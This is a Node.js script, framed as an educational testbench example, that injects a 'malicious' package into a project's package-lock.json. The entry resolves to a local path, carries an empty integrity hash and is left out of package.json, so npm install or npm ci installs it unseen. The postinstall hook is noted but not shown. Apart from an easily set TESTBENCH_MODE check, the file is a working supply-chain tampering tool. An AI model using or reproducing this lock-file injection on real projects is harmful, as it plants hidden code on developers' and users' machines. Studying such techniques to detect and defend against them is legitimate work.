#!/usr/bin/env node

/**
 * Lock File Manipulation Script
 * 
 * EDUCATIONAL EXAMPLE: This script demonstrates how package-lock.json
 * can be manipulated to inject malicious packages
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 * 
 * LEARNING OBJECTIVES:
 * - Understand how package-lock.json works
 * - Learn to detect lock file manipulation
 * - Practice defense strategies
 */

const fs = require('fs');
const path = require('path');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  console.error('❌ TESTBENCH_MODE must be enabled');
  process.exit(1);
}

/**
 * Manipulate package-lock.json to inject malicious package
 */
function manipulateLockFile(projectPath, maliciousPackagePath) {
  const packageLockPath = path.join(projectPath, 'package-lock.json');
  const maliciousPkgJson = path.join(maliciousPackagePath, 'package.json');

  if (!fs.existsSync(packageLockPath)) {
    console.error('❌ package-lock.json not found');
    return false;
  }

  if (!fs.existsSync(maliciousPkgJson)) {
    console.error('❌ Malicious package.json not found');
    return false;
  }

  // Read existing lock file
  const lockFile = JSON.parse(fs.readFileSync(packageLockPath, 'utf8'));
  const maliciousPkg = JSON.parse(fs.readFileSync(maliciousPkgJson, 'utf8'));

  // Inject malicious package into lock file
  const maliciousPackageName = maliciousPkg.name;
  const maliciousPackageVersion = maliciousPkg.version;

  console.log(`🔧 Injecting "${maliciousPackageName}@${maliciousPackageVersion}" into lock file...`);

  // Add to dependencies
  if (!lockFile.dependencies) {
    lockFile.dependencies = {};
  }

  // Create malicious package entry
  lockFile.dependencies[maliciousPackageName] = {
    "version": maliciousPackageVersion,
    "resolved": `file:${path.resolve(maliciousPackagePath)}`,
    "integrity": "",
    "extraneous": false,
    "requires": {}
  };

  // If malicious package has dependencies, add them too
  if (maliciousPkg.dependencies) {
    Object.keys(maliciousPkg.dependencies).forEach(dep => {
      lockFile.dependencies[maliciousPackageName].requires[dep] = maliciousPkg.dependencies[dep];
    });
  }

  // Add scripts if present
  if (maliciousPkg.scripts) {
    // Note: scripts in lock file are not standard, but we can add metadata
    lockFile.dependencies[maliciousPackageName]._hasPostinstall = !!maliciousPkg.scripts.postinstall;
  }

  // Write manipulated lock file
  fs.writeFileSync(packageLockPath, JSON.stringify(lockFile, null, 2));

  console.log(`✅ Successfully injected "${maliciousPackageName}" into package-lock.json`);
  console.log('');
  console.log('⚠️  WARNING: package-lock.json has been manipulated!');
  console.log('   The malicious package is now in the lock file');
  console.log('   but NOT in package.json');
  console.log('');
  console.log('   When npm install or npm ci runs, it will install');
  console.log('   the malicious package based on the lock file.');
  console.log('');

  return true;
}

// CLI Interface
if (require.main === module) {
  const projectPath = process.argv[2] || process.cwd();
  const maliciousPackagePath = process.argv[3] || path.join(__dirname, '../malicious-packages/evil-utils');

  if (!fs.existsSync(projectPath)) {
    console.error(`❌ Project path not found: ${projectPath}`);
    process.exit(1);
  }

  if (!fs.existsSync(maliciousPackagePath)) {
    console.error(`❌ Malicious package path not found: ${maliciousPackagePath}`);
    process.exit(1);
  }

  manipulateLockFile(projectPath, maliciousPackagePath);
}

module.exports = { manipulateLockFile };

